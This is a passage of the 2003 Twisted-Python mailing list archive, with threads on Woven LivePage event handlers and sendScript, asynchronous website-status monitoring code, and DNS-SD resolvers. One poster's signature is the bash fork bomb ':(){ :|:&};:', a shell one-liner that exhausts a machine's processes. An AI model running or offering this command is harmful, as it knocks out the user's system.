retransmissions, dissemination or other use of these materials by persons
or entities other than the intended recipient is prohibited. If received in
error, please contact us and delete all copies. Before opening or using
attachments, check them for viruses and defects. Our liability is limited
to resupplying any affected attachments. [Any representations or opinions
expressed in this e.mail are those of the individual sender, and not
necessarily those of Vision Systems Limited].
--------------------------------------------




From tim.andrews at adpro.com.au  Wed Jul 16 18:44:10 2003
From: tim.andrews at adpro.com.au (Tim Andrews)
Date: Thu, 17 Jul 2003 10:14:10 +0930
Subject: [Twisted-Python] with a subject this time - Woven LivePage beginners trouble
Message-ID: <MIEKLAIKJGMEAEJNJKJAGEPPCAAA.tim.andrews@adpro.com.au>

Hi twisted,

I've just started playing with twisted and am keen to get something
happening with  LivePage. I can serve pages quite happily from an .rpy and
have tried to follow the examples from the manual to get event handlers and
LivePage happening.  When my page is generated "MyController.handle" gets
called, but "MyController.setUp" never gets called.  If I add an "__init__"
method it gets called, but when I try to call "self.view.addEventHandler" it
complains that self.view is a NoneType.

I have also tried subclassing input.Anything, but suffer from a similar
problem in that my "initialize" method never gets called or if I call
"input.Anything.__init__" then I still have a problem with
"self.view.addEventHandler"

FYI I'm running twisted 1.06 on Python 2.2 on a Windows 2000 box

My code for your perusal ...

from twisted.web.woven import page, controller

model = {
    'name': 'fred',
    'stuff': ['Foo', 'Bar', 'Baz']
}

template = """
  <html>
  <body>
  <h3 model="name" view="Text"  controller = "foo"/>
  <div model="stuff" view="List">
  <li pattern="listItem" view="Text"/>
  </div>
  <span view="webConduitGlue" />
  </body>
  </html>
"""

class MyController(controller.Controller):

#  def __init__(self, *args, **kwargs):
#    controller.Controller.__init__(self, args, kwargs)
#    self.view.addEventHandler("onmouseover", self.mouse) # self.view =
NoneType :(

  def setUp(self, request, *args):
    print "setUp" # this never happens :(

  def handle(self, request):
    print 'handle' # this happens :)

  def mouse(self, request, widget):
    print 'Mouse Over!!!'


class MyPage(page.LivePage):

  def wcfactory_foo(self, request, node, model):
    print 'foo factory' # this happens :)
    return MyController(model)


resource = MyPage(model, template=template)


Thanks,

Tim

PS sorry about the finger trouble
----------------------------------------
Tim Andrews
Principal Hardware Engineer

Vision Fire and Security
14 Park Way, Technology Park
Mawson Lakes, S.A. 5095

ph: +61-8-84621201
fax: +61-8-84621001
email: Tim.Andrews at adpro.com.au
web site: www.adpro.com.au

----------------------------------------
IMPORTANT ? This email and any attachments may be confidential. Any
retransmissions, dissemination or other use of these materials by persons
or entities other than the intended recipient is prohibited. If received in
error, please contact us and delete all copies. Before opening or using
attachments, check them for viruses and defects. Our liability is limited
to resupplying any affected attachments. [Any representations or opinions
expressed in this e.mail are those of the individual sender, and not
necessarily those of Vision Systems Limited].
--------------------------------------------




From dp at twistedmatrix.com  Wed Jul 16 20:46:42 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Wed, 16 Jul 2003 19:46:42 -0700
Subject: [Twisted-Python] with a subject this time - Woven LivePage beginners trouble
In-Reply-To: <MIEKLAIKJGMEAEJNJKJAGEPPCAAA.tim.andrews@adpro.com.au>
References: <MIEKLAIKJGMEAEJNJKJAGEPPCAAA.tim.andrews@adpro.com.au>
Message-ID: <E5ACAE2D-B800-11D7-AA99-000A95864FC4@twistedmatrix.com>

On Wednesday, July 16, 2003, at 5:44PM, Tim Andrews wrote:

> Hi twisted,
>
> I've just started playing with twisted and am keen to get something
> happening with  LivePage. I can serve pages quite happily from an .rpy 
> and
> have tried to follow the examples from the manual to get event 
> handlers and
> LivePage happening.  When my page is generated "MyController.handle" 
> gets
> called, but "MyController.setUp" never gets called.  If I add an 
> "__init__"
> method it gets called, but when I try to call 
> "self.view.addEventHandler" it
> complains that self.view is a NoneType.

Just move the addEventHandler into handle, that gets called after the 
view has been created and hooked up.

I'm not sure why controllers have a handle or a setUp... I really need 
to do some API pruning on Woven...

Just don't scream when I break your app and you have to rename 
something slightly! It's for the good of the community! :-)

dp




From tim.andrews at adpro.com.au  Wed Jul 16 23:13:42 2003
From: tim.andrews at adpro.com.au (Tim Andrews)
Date: Thu, 17 Jul 2003 14:43:42 +0930
Subject: [Twisted-Python] with a subject this time - Woven LivePage beginners trouble
Message-ID: <MIEKLAIKJGMEAEJNJKJAKEPPCAAA.tim.andrews@adpro.com.au>

Many thanks - all better now.  
This has some seriously horny applications for me!

Tim

On Wednesday, July 16, 2003, at 5:44PM, Tim Andrews wrote:

> Hi twisted,
>
> I've just started playing with twisted and am keen to get something
> happening with  LivePage. I can serve pages quite happily from an .rpy 
> and
> have tried to follow the examples from the manual to get event 
> handlers and
> LivePage happening.  When my page is generated "MyController.handle" 
> gets
> called, but "MyController.setUp" never gets called.  If I add an 
> "__init__"
> method it gets called, but when I try to call 
> "self.view.addEventHandler" it
> complains that self.view is a NoneType.

Just move the addEventHandler into handle, that gets called after the 
view has been created and hooked up.

I'm not sure why controllers have a handle or a setUp... I really need 
to do some API pruning on Woven...

Just don't scream when I break your app and you have to rename 
something slightly! It's for the good of the community! :-)

dp


_______________________________________________
Twisted-Python mailing list
Twisted-Python at twistedmatrix.com
http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python




From smurf at smurf.noris.de  Thu Jul 17 04:40:32 2003
From: smurf at smurf.noris.de (Matthias Urlichs)
Date: Thu, 17 Jul 2003 12:40:32 +0200
Subject: [Twisted-Python] How Twisted is This?
References: <20030716152520.GA19537@xdsk200> <pan.2003.07.16.15.47.03.115396@smurf.noris.de> <20030716155758.GA19921@xdsk200>
Message-ID: <pan.2003.07.17.10.40.28.502600@smurf.noris.de>

Hi, Brad Bollenbach wrote:

> Because it's known that monitors can be run at either 5 or 15 minute
> intervals. To wake up every five minutes is the simplest.

... unless you want, two years from now, to scan a service every five
seconds (bonus points: with exponential back-off) because you have a
fickle customer who needs that sort of reassurance.

Besides, if the jobs all have their own timing mechanism you can spread
them over your five-minute interval. You can also a small random offset to
each timeout, which means that you won't have problems with load spikes
every five minutes which might skew your answer time statistics. Not to
mention that a mostly-idle background job will mostly stay in memory,
while one which sleeps for five minutes may well be swapped out by the
time it runs again.

> In any case, this is just an implementation detail, outside the point of
> whether or not Twisted is what I'm looking for to minimize the amount of
> time and effort needed to getting a running, sellable system.

I respectfully disagree. It's a case of "use the framework the way it's
intended", which is a skill you'll need in other areas too.

YMMV, but that is very much my experience, with Twisted in particular.

-- 
Matthias Urlichs   |   {M:U} IT Design @ m-u-it.de   |  smurf at smurf.noris.de
Disclaimer: The quote was selected randomly. Really. | http://smurf.noris.de
-- 
You ask what a nice girl will do?  She won't give an inch, but she won't
say no.
		-- Marcus Valerius Martialis




From m at moshez.org  Thu Jul 17 05:10:29 2003
From: m at moshez.org (Moshe Zadka)
Date: 17 Jul 2003 11:10:29 -0000
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <pan.2003.07.17.10.40.28.502600@smurf.noris.de>
References: <pan.2003.07.17.10.40.28.502600@smurf.noris.de>, <20030716152520.GA19537@xdsk200> <pan.2003.07.16.15.47.03.115396@smurf.noris.de> <20030716155758.GA19921@xdsk200>
Message-ID: <20030717111029.22846.qmail@green.zadka.com>

[Brad]
> In any case, this is just an implementation detail, outside the point of
> whether or not Twisted is what I'm looking for to minimize the amount of
> time and effort needed to getting a running, sellable system.

[Matthias Urlichs]
> I respectfully disagree. It's a case of "use the framework the way it's
> intended", which is a skill you'll need in other areas too.
> 
> YMMV, but that is very much my experience, with Twisted in particular.

Well, he was still technically right: the question of whether to use
Twisted or not is unrelated: he should use Twisted. Then the question
of best use of Twisted comes, and not trying to use hacks to get a worse
program starts seems like a useful idea :) 
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From tv at twistedmatrix.com  Thu Jul 17 03:55:29 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 17 Jul 2003 12:55:29 +0300
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <50E4C45B-B7DE-11D7-8336-000A95686CD8@redivi.com>
References: <3F15BB31.27794375@engcorp.com> <50E4C45B-B7DE-11D7-8336-000A95686CD8@redivi.com>
Message-ID: <20030717095529.GB2302@lapdog>

On Wed, Jul 16, 2003 at 06:39:09PM -0400, Bob Ippolito wrote:
> watch out for when writing a web spider, for example.  It just doesn't 
> make sense to intentionally design something that behaves like: 
> ______/\___________/\_____ when you really have an extremely 
> parallelizable task at hand.  Checking site A is in no way dependent on 
> checking site B, so there's no reason to intentionally make them happen 
> at the same time if you know better.  We're not talking about a whole 
> lot of code here.  Leveraging the fact that 99% of what needs to be 
> done is glue code between stuff that's already in twisted, a prototype 
> of his application could be easily be done in less than fifty lines 
> using the scalable approach.  In fact, I think that the "wake up and do 
> stuff every N minutes" approach would actually end up being a longer 
> and easier to screw up implementation.

	You all should probably read up on what the Nagios project
	thinks about randomizing monitoring intervals. They have a
	stable open source product that can scale reasonably well,
	and have good opinions on that subject.

-- 
:(){ :|:&};:



From michal at sabren.com  Thu Jul 17 08:28:49 2003
From: michal at sabren.com (Michal Wallace)
Date: Thu, 17 Jul 2003 10:28:49 -0400 (EDT)
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716172440.GA20186@xdsk200>
Message-ID: <Pine.LNX.4.44.0307171023060.27933-100000@hydrogen.sabren.com>

On Wed, 16 Jul 2003, Brad Bollenbach wrote:

> Well, I'm sure I mean I want to block.
> 
> Unless I don't (in which case Twisted would have to prove to me that I
> don't).
> 
> Here's an example use case for a monitoring check:
> 
> 1. open web page and store cookie that it gives us
> 2. did we get the page ok? (yes)
> 3. submit the form with values foo=bar and baz=spam (and the cookie we 
> got in step 1)
> 4. did the response get retrieved ok? (yes)
> 5. is the string "Welcome to blah blah blah" present in this page? (no)
> 6. return a "NOT OK" for this monitor


Hmm. I run a site that monitors several hundred web pages 
every hour. I'd have to agree that blocking isn't the best
choice. 

What if the site is down? Or for some reason is really
slow? And it takes several minutes to fetch each page?
Then 5 minutes later, your monicron tool fires up again,
but the first one isn't even finished, and so on. Pretty
soon your server has 2039482304 python instances in memory.

If you're using a timeoutsocket, you might be okay, but 
even then a few timeouts in a row can make your execution
time needlessly long.


Sincerely,
 
Michal J Wallace
Sabren Enterprises, Inc.
-------------------------------------
contact: michal at sabren.com
hosting: http://www.cornerhost.com/
my site: http://www.withoutane.com/
--------------------------------------





From brad at bbnet.ca  Thu Jul 17 14:30:15 2003
From: brad at bbnet.ca (Brad Bollenbach)
Date: Thu, 17 Jul 2003 16:30:15 -0400
Subject: [Twisted-Python] Simplifying my StatusMonitor
Message-ID: <20030717203015.GA24175@xdsk200>

Hi,

Okay, in the usual XP fashion, I'm doing a spike to assess two use cases
for Twisted:

1. Writing a simple monitor that checks the status of a response, to see
what it's like to write a foobar in Twisted.

2. How to schedule multiple monitor batches so they can run and report
back to a "central command" (maybe CentralCommand or something), which
can then determine whether or not (and to whom) an error report should
be sent. (I've scrapped the idea of a "monicron")

I did #1 this morning. It's 49 lines of Python, in what would have
otherwise been less than five of "normal", blocking code:

==== begin code ====

#!/usr/bin/python2.2

from twisted.web import client

class HTTPPageStatusGetter(client.HTTPPageGetter):
    """A getter that tells clients the status of a response"""
    
    def handleStatus(self, version, status, message):
        client.HTTPPageGetter.handleStatus(self, version, status, message)
        self.factory.status(status)

class StatusMonitorFactory(client.HTTPClientFactory):
    """An HTTP Monitor that does something interesting with the
    HTTP status returned."""

    protocol = HTTPPageStatusGetter

    def page(self, page):
        pass

    def noPage(self, reason):
        pass
        
    def status(self, status):
        if self.waiting:
            self.waiting = 0
            self.deferred.callback(status)
    
class StatusMonitor:
    def checkFor200OK(self, url):
        host, port, url = client._parse(url)
        factory = StatusMonitorFactory(host, url)
        reactor.connectTCP(host, port, factory)
        factory.deferred.addCallback(self.gotStatus, url)
        factory.deferred.addErrback(self.reportError, url)
        return factory.deferred

    def gotStatus(self, status, url):
        print "hooray, got status %s" % status

    def reportError(self, failure, url):
        print ":( There was a problem in %s" % url
        print failure

from twisted.internet import reactor

d = StatusMonitor().checkFor200OK('http://www.bbnet.ca/')
d.addCallback(lambda *a: reactor.stop())
reactor.run()

==== end code ====

How could I have made this simpler? What approach would you have taken
to solve this problem?

--
Brad Bollenbach
BBnet.ca



From lists at gregfortune.com  Thu Jul 17 17:11:36 2003
From: lists at gregfortune.com (Greg Fortune)
Date: Thu, 17 Jul 2003 16:11:36 -0700
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030717095529.GB2302@lapdog>
References: <3F15BB31.27794375@engcorp.com> <50E4C45B-B7DE-11D7-8336-000A95686CD8@redivi.com> <20030717095529.GB2302@lapdog>
Message-ID: <200307171611.36714.lists@gregfortune.com>

On Thursday 17 July 2003 02:55 am, Tommi Virtanen wrote:
> On Wed, Jul 16, 2003 at 06:39:09PM -0400, Bob Ippolito wrote:
> > watch out for when writing a web spider, for example.  It just doesn't
> > make sense to intentionally design something that behaves like:
> > ______/\___________/\_____ when you really have an extremely
> > parallelizable task at hand.  Checking site A is in no way dependent on
> > checking site B, so there's no reason to intentionally make them happen
> > at the same time if you know better.  We're not talking about a whole
> > lot of code here.  Leveraging the fact that 99% of what needs to be
> > done is glue code between stuff that's already in twisted, a prototype
> > of his application could be easily be done in less than fifty lines
> > using the scalable approach.  In fact, I think that the "wake up and do
> > stuff every N minutes" approach would actually end up being a longer
> > and easier to screw up implementation.
>
> 	You all should probably read up on what the Nagios project
> 	thinks about randomizing monitoring intervals. They have a
> 	stable open source product that can scale reasonably well,
> 	and have good opinions on that subject.

I'm pretty sure no one is talking about randomizing...  One solution is a 
fixed interval check and the other is a "as needed" check.  The only ways I 
can imagine that a "as needed" check would be more costly is if the monitors 
were queued very frequently and the controller ended up waking up/sleeping 
very very short intervals or if a huge number of monitors were queued with 
start times far into the future and the controller took a long time to search 
the list for the next pending monitor.  An intelligent insertion routine 
could solve the second issue easily and if a five minute check is sufficient, 
I can't imagine the first issue being a problem...


btw, I couldn't find that doc with a quick look at http://www.nagios.org/.  Do 
you have a direct link 'cause I'm curious regardless :)

Greg




From tim.andrews at adpro.com.au  Thu Jul 17 18:37:23 2003
From: tim.andrews at adpro.com.au (Tim Andrews)
Date: Fri, 18 Jul 2003 10:07:23 +0930
Subject: [Twisted-Python] Woven LivePage sendScript works with some scripts but not others
Message-ID: <MIEKLAIKJGMEAEJNJKJAKEAACBAA.tim.andrews@adpro.com.au>

Hi twisted,

I'm trying to use LivePage to send some script to a web page.

All works well if the script is as per the manual example, ie
sendScript("alert('Hello world!')")
will pop up a window as expected.

However, if i try a script like "document.all.fred.innerHTML='FRED'" I get
an error on the page "Error: document.all.fred is null or not an object". I
know the script is okay because if it is on the on the page it will work.

Any clues?

Thanks,

Tim


Some example code for your perusal ...


from twisted.web.woven import page, controller, interfaces

model = {
    'name': 'LivePage Handled Events',
    'link': 'http://link',
}

template = """
  <html>
   <body>
     <h3> Watch me change! </h3>
     <div id = "fred"> blah </div>
     <h3 model="name" view="Text"/>
     <div model="link" view="Link" controller="foo">mouse here won't work
:(</div>
     <span view="webConduitGlue" />
     <h3>Locally Handled Events</h3>
     <a href="http://link"
        onmouseover="document.all.fred.innerHTML='FRED'"
        onmouseout="document.all.fred.innerHTML='fred'">mouse here will work
:)
     </a>
   </body>
  </html>
"""

class fooController(controller.Controller):

  def handle(self, request):
    global currentPage
    currentPage = request.getSession(interfaces.IWovenLivePage)
    self.view.addEventHandler("onmouseover", self.foo_onMouseOver)
    self.view.addEventHandler("onmouseout", self.foo_onMouseOut)

  def foo_onMouseOver(self, request, widget):
    global currentPage
    print 'foo over'
    currentPage.sendScript("document.all.fred.innerHTML='FRED'") # :( this
doesn't work
    # currentPage.sendScript("alert('Hello world!')") # :) this works

  def foo_onMouseOut(self, request, widget):
    global currentPage
    print 'foo out'
    currentPage.sendScript("document.all.fred.innerHTML='fred'") # :( this
doesn't work

class fooPage(page.LivePage):

  def wcfactory_foo(self, request, node, model):
    return fooController(model)

resource = fooPage(model, template=template)




From bob at redivi.com  Thu Jul 17 18:44:14 2003
From: bob at redivi.com (Bob Ippolito)
Date: Thu, 17 Jul 2003 20:44:14 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <200307171611.36714.lists@gregfortune.com>
Message-ID: <F44179D9-B8B8-11D7-8336-000A95686CD8@redivi.com>

On Thursday, Jul 17, 2003, at 19:11 America/New_York, Greg Fortune 
wrote:

> On Thursday 17 July 2003 02:55 am, Tommi Virtanen wrote:
>> On Wed, Jul 16, 2003 at 06:39:09PM -0400, Bob Ippolito wrote:
>>> watch out for when writing a web spider, for example.  It just 
>>> doesn't
>>> make sense to intentionally design something that behaves like:
>>> ______/\___________/\_____ when you really have an extremely
>>> parallelizable task at hand.  Checking site A is in no way dependent 
>>> on
>>> checking site B, so there's no reason to intentionally make them 
>>> happen
>>> at the same time if you know better.  We're not talking about a whole
>>> lot of code here.  Leveraging the fact that 99% of what needs to be
>>> done is glue code between stuff that's already in twisted, a 
>>> prototype
>>> of his application could be easily be done in less than fifty lines
>>> using the scalable approach.  In fact, I think that the "wake up and 
>>> do
>>> stuff every N minutes" approach would actually end up being a longer
>>> and easier to screw up implementation.
>>
>> 	You all should probably read up on what the Nagios project
>> 	thinks about randomizing monitoring intervals. They have a
>> 	stable open source product that can scale reasonably well,
>> 	and have good opinions on that subject.
>
> I'm pretty sure no one is talking about randomizing...  One solution 
> is a
> fixed interval check and the other is a "as needed" check.  The only 
> ways I
> can imagine that a "as needed" check would be more costly is if the 
> monitors
> were queued very frequently and the controller ended up waking 
> up/sleeping
> very very short intervals or if a huge number of monitors were queued 
> with
> start times far into the future and the controller took a long time to 
> search
> the list for the next pending monitor.  An intelligent insertion 
> routine
> could solve the second issue easily and if a five minute check is 
> sufficient,
> I can't imagine the first issue being a problem...

Randomizing events is a rather good way to prevent collisions.  
Ethernet, for example, uses randomized delays when a collision happens. 
  This is how it can work without the complications of passing a token 
around or what have you.  Random delays are also often used for 
cryptography (I believe OpenSSL does this now) to prevent a certain 
kind of attacks.  As you said, it's not something strictly necessary at 
all for this sort of application, unless a lot of events are queued to 
fire at the same time (which is the issue I brought up, originally).  
Imagine, for example, the application starts up with a database of 
40,000 hosts to check at a 5 minute interval.  If the application 
starts _all_ of them at the same time, you're going to see much worse 
performance than if it scheduled them all with some random offset.  The 
other thing is that it's rather easy to implement, especially with 
Twisted.

Also, switching between sleeping and waking up isn't the worst thing in 
the world - it means network activity is happening (or you're polling, 
which is silly).

-bob




From speno at isc.upenn.edu  Thu Jul 17 20:07:05 2003
From: speno at isc.upenn.edu (John P Speno)
Date: Thu, 17 Jul 2003 22:07:05 -0400
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com>
References: <16136.11049.63479.337891@frank.xprtcc.com> <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com>
Message-ID: <20030718020705.GA4889@isc.upenn.edu>

On Mon, Jul 07, 2003 at 11:38:38PM +1000, Tim Allen wrote:
> DNS-SD (DNS based Service Discovery) is the easy part - it's just a  
> standard way of organising DNS records such that a set of DNS queries  
> can create a useful list of things to connect to. 'Implementing' DNS-SD  
> support is not at all difficult, providing there exists an API to  
> request PTR and SRV records, and providing you can add them to your DNS  
> server.

Besides the resolver in Twisted, I have also seen dnspython from
http://www.dnspython.com and I like it. It also does its own resolving
directly, like Twisted.



From dp at twistedmatrix.com  Thu Jul 17 20:56:19 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Thu, 17 Jul 2003 19:56:19 -0700
Subject: [Twisted-Python] Woven LivePage sendScript works with some scripts but not others
In-Reply-To: <MIEKLAIKJGMEAEJNJKJAKEAACBAA.tim.andrews@adpro.com.au>
References: <MIEKLAIKJGMEAEJNJKJAKEAACBAA.tim.andrews@adpro.com.au>
Message-ID: <682260F0-B8CB-11D7-951E-000A95864FC4@twistedmatrix.com>

On Thursday, July 17, 2003, at 5:37PM, Tim Andrews wrote:

>
> Hi twisted,
>
> I'm trying to use LivePage to send some script to a web page.
>
> All works well if the script is as per the manual example, ie
> sendScript("alert('Hello world!')")
> will pop up a window as expected.
>
> However, if i try a script like "document.all.fred.innerHTML='FRED'" I 
> get
> an error on the page "Error: document.all.fred is null or not an 
> object". I
> know the script is okay because if it is on the on the page it will 
> work.
>
> Any clues?

This is *probably* because, with the version of LivePage you are 
currently using, the JavaScript is evaluated within the context of the 
Output IFrame. I'm not a regular in-browser javascript expert, but 
something like top.document.all.fred or parent.document.all.fred might 
work better for you.

By the way, if you are trying to do your own innerHTML setting, don't. 
Woven LivePage includes a cross-browser abstraction of this sort of 
in-browser DOM mutation. Just write your Widgets in a way that they 
will always render themselves the way you want them to based on the 
Model data and the state of the session. (For example, you could set 
session.color = 'blue' and it would be different from someone else who 
has session.color = 'green')

Then, use one of the MVC notification APIs to cause Woven to re-render 
your Widget and send the appropriate, abstract JavaScript to the 
browser:

someWidgetReference. modelChanged({'request': request})

or

someModelReference.notify({'request': request})


Why the hideous dictionary-with-the-request-in-it? Ancient historical 
reasons which are entirely irrelevant now. I will change it to simply 
take the request asap, but for now, just do that :-)

dp




From wari at home.wari.org  Thu Jul 17 21:42:04 2003
From: wari at home.wari.org (Wari Wahab)
Date: Fri, 18 Jul 2003 11:42:04 +0800
Subject: [Twisted-Python] Simplifying my StatusMonitor
In-Reply-To: <20030717203015.GA24175@xdsk200>
References: <20030717203015.GA24175@xdsk200>
Message-ID: <3F176C8C.1040303@home.wari.org>

Brad Bollenbach wrote:

>Okay, in the usual XP fashion, I'm doing a spike to assess two use cases
>for Twisted:
>
>1. Writing a simple monitor that checks the status of a response, to see
>what it's like to write a foobar in Twisted.
>[..snip..]
>I did #1 this morning. It's 49 lines of Python, in what would have
>otherwise been less than five of "normal", blocking code:
>[..snip code..]]
>How could I have made this simpler? What approach would you have taken
>to solve this problem?
>  
>
Although the code seems like a lot, but it looks like you've gained 
something that does not block. For example, you can check a few sites 
concurrently this way.

I changed the code a bit so that I get more interesting results out of 
it. And from the results, you see that the return of the status != the 
order you called it, which is the nature of the internet.
wari at minisync:~$ python testspike.py
Got request for http://www.bbnet.ca/
Got request for http://roughingit.wari.org/
Got request for http://www.yahoo.com/
Got request for http://www.twistedmatrix.com/
hooray, got status 200 for http://roughingit.wari.org/
hooray, got status 200 for http://www.twistedmatrix.com/
hooray, got status 200 for http://www.yahoo.com/
hooray, got status 200 for http://www.bbnet.ca/

The call I did is this:
StatusMonitor().checkFor200OK('http://www.bbnet.ca/')
StatusMonitor().checkFor200OK('http://roughingit.wari.org/')
StatusMonitor().checkFor200OK('http://www.yahoo.com/')
StatusMonitor().checkFor200OK('http://www.twistedmatrix.com/')
#d.addCallback(lambda *a: reactor.stop())
reactor.callLater(5, reactor.stop)

PS: To twisted developers, why can't I do
d = StatusMonitor().checkFor200OK('http://www.bbnet.ca/')
d.addCallback(StatusMonitor().checkFor200OK, 'http://www.yahoo.com')

The reactor will be stuck after the bbnet.ca call.




From tim.andrews at adpro.com.au  Thu Jul 17 22:25:19 2003
From: tim.andrews at adpro.com.au (Tim Andrews)
Date: Fri, 18 Jul 2003 13:55:19 +0930
Subject: [Twisted-Python] Woven LivePage sendScript works with some scripts but not others
In-Reply-To: <682260F0-B8CB-11D7-951E-000A95864FC4@twistedmatrix.com>
Message-ID: <MIEKLAIKJGMEAEJNJKJAEEABCBAA.tim.andrews@adpro.com.au>

> > I'm trying to use LivePage to send some script to a web page.
> >
> > All works well if the script is as per the manual example, ie
> > sendScript("alert('Hello world!')")
> > will pop up a window as expected.
> >
> > However, if i try a script like "document.all.fred.innerHTML='FRED'" I
> > get
> > an error on the page "Error: document.all.fred is null or not an
> > object". I
> > know the script is okay because if it is on the on the page it will
> > work.
> >
> > Any clues?
>
> This is *probably* because, with the version of LivePage you are
> currently using, the JavaScript is evaluated within the context of the
> Output IFrame. I'm not a regular in-browser javascript expert, but
> something like top.document.all.fred or parent.document.all.fred might
> work better for you.

Both of these work, thankyou.

>
> By the way, if you are trying to do your own innerHTML setting, don't.

I was just experimenting here as it more familiar territory.

> Woven LivePage includes a cross-browser abstraction of this sort of
> in-browser DOM mutation. Just write your Widgets in a way that they
> will always render themselves the way you want them to based on the
> Model data and the state of the session. (For example, you could set
> session.color = 'blue' and it would be different from someone else who
> has session.color = 'green')
>
> Then, use one of the MVC notification APIs to cause Woven to re-render
> your Widget and send the appropriate, abstract JavaScript to the
> browser:
>
> someWidgetReference. modelChanged({'request': request})
>
> or
>
> someModelReference.notify({'request': request})

Could you give me a few more hints here please.  I'm still trying to get my
head around Chapter 7 of "The Twisted Documentation".  Is there anything
else to read in conjunction or should I start wading through the code?

Thanks,

Tim

>
>
> Why the hideous dictionary-with-the-request-in-it? Ancient historical
> reasons which are entirely irrelevant now. I will change it to simply
> take the request asap, but for now, just do that :-)
>
> dp
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>




From andrew-twisted at puzzling.org  Thu Jul 17 22:27:30 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Fri, 18 Jul 2003 14:27:30 +1000
Subject: [Twisted-Python] Simplifying my StatusMonitor
In-Reply-To: <3F176C8C.1040303@home.wari.org>
References: <20030717203015.GA24175@xdsk200> <3F176C8C.1040303@home.wari.org>
Message-ID: <20030718042729.GG7618@frobozz>

On Fri, Jul 18, 2003 at 11:42:04AM +0800, Wari Wahab wrote:
> 
> PS: To twisted developers, why can't I do
> d = StatusMonitor().checkFor200OK('http://www.bbnet.ca/')
> d.addCallback(StatusMonitor().checkFor200OK, 'http://www.yahoo.com')
> 
> The reactor will be stuck after the bbnet.ca call.

Probably because the first argument to a callback is the result of the
previous call back.  Perhaps this will do what you want:


d = StatusMonitor().checkFor200OK('http://www.bbnet.ca/')
d.addCallback(lambda result, url: StatusMonitor().checkFor200OK(url), 
              'http://www.yahoo.com')

-Andrew.




From oisin at enginesofcreation.ie  Fri Jul 18 05:27:24 2003
From: oisin at enginesofcreation.ie (Oisin Mulvihill)
Date: Fri, 18 Jul 2003 12:27:24 +0100
Subject: [Twisted-Python] help, my woven web app won't work on win32 but will on linux!
Message-ID: <3F17D99C.9000908@enginesofcreation.ie>

Hi,

I've produced a small model of my program which hightlights
the problem I'm having. Attached are two files main.py and
index.rpy. To run the web app run main and make sure index.rpy
is in the same directory. Then point your web browser to
http://localhost:20808

On linux I can click on the web buttons and the app works
fine. One windows (I'm using win2k) I simply get
"No Such Resource, File not found".

The button press issues a post and this shows up as the url
"http://localhost:20808/control?action=set_view&view=view1"

When you look at the MyPage class in index.rpy I have a
wchild_control method. This method is called on linux and
I then process the request and take the required action.

On windows the wchild_control method does not appear to be
called at all and I don't know why.

Can anyone shed any light on this problem?

Thanks,


om
-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030718/4e00556d/attachment.html>
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: main.py
URL: </pipermail/twisted-python/attachments/20030718/4e00556d/attachment.ksh>

From brad at bbnet.ca  Fri Jul 18 07:31:15 2003
From: brad at bbnet.ca (Brad Bollenbach)
Date: Fri, 18 Jul 2003 09:31:15 -0400
Subject: [Twisted-Python] Simplifying my StatusMonitor
In-Reply-To: <3F176C8C.1040303@home.wari.org>
References: <20030717203015.GA24175@xdsk200> <3F176C8C.1040303@home.wari.org>
Message-ID: <20030718133115.GA26501@xdsk200>

On Fri, Jul 18, 2003 at 11:42:04AM +0800, Wari Wahab wrote:
> Brad Bollenbach wrote:
> 
> >Okay, in the usual XP fashion, I'm doing a spike to assess two use cases
> >for Twisted:
> >
> >1. Writing a simple monitor that checks the status of a response, to see
> >what it's like to write a foobar in Twisted.
> >[..snip..]
> >I did #1 this morning. It's 49 lines of Python, in what would have
> >otherwise been less than five of "normal", blocking code:
> >[..snip code..]]
> >How could I have made this simpler? What approach would you have taken
> >to solve this problem?
> > 
> >
> Although the code seems like a lot, but it looks like you've gained 
> something that does not block. For example, you can check a few sites 

I don't buy this. I'd sooner take 45 fewer lines of code that /do/
block, and add 3 more lines to make it run in a thread. This is just a
basic test, I shudder to think at the complexity that would be added to
monitor complex transactions.

However, I'm not saying that I don't like Twisted, I'm saying there must
be a better way, and I want those in the know to show me what I'm doing
wrong. :)

> concurrently this way.
> 
> I changed the code a bit so that I get more interesting results out of 
> it. And from the results, you see that the return of the status != the 
> order you called it, which is the nature of the internet.
> wari at minisync:~$ python testspike.py
> Got request for http://www.bbnet.ca/
> Got request for http://roughingit.wari.org/
> Got request for http://www.yahoo.com/
> Got request for http://www.twistedmatrix.com/
> hooray, got status 200 for http://roughingit.wari.org/
> hooray, got status 200 for http://www.twistedmatrix.com/
> hooray, got status 200 for http://www.yahoo.com/
> hooray, got status 200 for http://www.bbnet.ca/
> 
> The call I did is this:
> StatusMonitor().checkFor200OK('http://www.bbnet.ca/')
> StatusMonitor().checkFor200OK('http://roughingit.wari.org/')
> StatusMonitor().checkFor200OK('http://www.yahoo.com/')
> StatusMonitor().checkFor200OK('http://www.twistedmatrix.com/')
> #d.addCallback(lambda *a: reactor.stop())
> reactor.callLater(5, reactor.stop)

I'm very new to Twisted (I'm only 48 hours old in Twisted-time), but I
think you meant to use a DeferredList here. At any rate, this code
doesn't make things any simpler, which is what I'm really after (lazy,
impatience and all that).

--
Brad Bollenbach
BBnet.ca



From mesozoic at polynode.com  Fri Jul 18 10:44:22 2003
From: mesozoic at polynode.com (mesozoic)
Date: Fri, 18 Jul 2003 16:44:22 +0000
Subject: [Twisted-Python] Accessing app-wide data in Woven
Message-ID: <20030718164422.GC7740@perpetual.moxn.net>
